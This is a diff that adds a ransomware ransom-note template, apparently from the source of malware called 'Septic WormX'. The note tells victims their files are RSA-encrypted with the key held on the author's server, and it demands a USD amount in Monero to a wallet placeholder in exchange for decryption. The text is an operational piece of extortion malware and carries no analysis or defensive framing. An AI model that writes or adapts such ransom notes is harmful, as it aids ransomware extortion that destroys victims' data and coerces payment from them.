@@ -1,0 +1,12 @@
+Hello, User
+
+If you're reading this that likely means you've been infected with the Septic WormX client. 
+
+             ----------------------------------------------------------
+All of your files have been encrypted using the RSA encryption algorithm, and the key to decrypt them is being stored securely on my webserver. 
+
+You don't have to pay, in fact if you'd like you can just remove the virus, or format your drive, but your files will remain encrypted
+
+If you'd like to have your files recovered send $AMOUNT USD to my Monero(XMR) address: WALLET
+
+Once the payment has been sent your files will automatically be restored and the virus uninstalled from your computer's memory.
